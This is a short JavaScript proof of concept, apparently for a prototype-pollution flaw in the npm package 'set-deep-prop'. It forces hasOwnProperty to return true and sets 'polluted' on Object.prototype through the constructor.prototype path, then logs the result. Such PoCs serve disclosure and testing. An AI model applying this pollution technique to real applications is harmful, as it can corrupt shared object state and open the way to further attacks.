Object.prototype.hasOwnProperty = () => true;
const setDeepProp = require('set-deep-prop');
var obj = {};
console.log({}.polluted);
setDeepProp({}, [
    'constructor',
    'prototype',
    'polluted'
], 'yes');
console.log({}.polluted);